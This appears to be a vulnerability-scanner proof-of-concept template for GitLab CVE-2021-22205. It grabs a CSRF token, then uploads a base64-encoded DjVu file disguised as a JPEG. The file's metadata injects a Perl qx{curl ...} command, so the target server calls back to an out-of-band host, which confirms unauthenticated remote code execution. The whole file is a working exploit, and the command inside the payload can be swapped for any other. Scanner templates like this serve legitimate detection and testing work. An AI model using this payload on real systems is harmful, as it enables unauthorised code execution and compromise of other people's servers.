name: yaml-poc-gitlab-gitlab-rce-CVE-2021-22205
binding: 830c2df3-5e90-495e-8050-deb3b4b78227
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/164768/GitLab-Unauthenticated-Remote-ExifTool-Command-Injection.html
        - http://packetstormsecurity.com/files/164994/GitLab-13.10.2-Remote-Code-Execution.html
        - https://cxsecurity.com/issue/WLB-2021110075
        - https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22205.json
        - https://gitlab.com/gitlab-org/gitlab/-/issues/327121
        - https://hackerone.com/reports/1154542
        - https://help.aliyun.com/noticelist/articleid/1060932547.html
        - https://nvd.nist.gov/vuln/detail/CVE-2021-22205
        - https://packetstormsecurity.com/files/164768/GitLab-Unauthenticated-Remote-ExifTool-Command-Injection.html
        - https://packetstormsecurity.com/files/164994/GitLab-13.10.2-Remote-Code-Execution.html
        - https://www.auscert.org.au/bulletins/ESB-2021.3666
        - https://www.cybersecurity-help.cz/vdb/SB2021042211
        - https://www.cybersecurity-help.cz/vdb/SB2021042936
        - https://www.exploit-db.com/exploits/50532
    vulnerability:
        id: f18e2245-0415-40cd-8521-a339b6442659
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /users/sign_in
        expression: response.status == 200
        output:
            search: '"\"csrf-token\" content=\"(?P<csrftoken>.+?)\"".bsubmatch(response.body)'
            csrftoken: search["csrftoken"]
    r1:
        request:
            cache: true
            method: POST
            path: /uploads/user
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
                X-CSRF-Token: '{{csrftoken}}'
            body: !!binary |
                DQotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlJTXYzbXhSZzU5VGtGU1g1DQpDb250ZW50LU
                Rpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0idGVzdC5q
                cGciDQpDb250ZW50LVR5cGU6IGltYWdlL2pwZWcNCg0KQVQmVEZPUk0AAAOvREpWTURJUk
                0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZP
                Uk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAE
                JHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0A
                AAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHtjdXJsIH
                t7cmV2ZXJzZVVSTH19fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAg
                ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
                AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
                ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
                AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
                ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
                AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
                ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
                AgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg0KLS0tLS0tV2ViS2l0Rm9ybUJvdW5k
                YXJ5SU12M214Umc1OVRrRlNYNS0tDQo=
        expression: response.status == 422 && reverse.wait(5)
expression: r0() && r1()
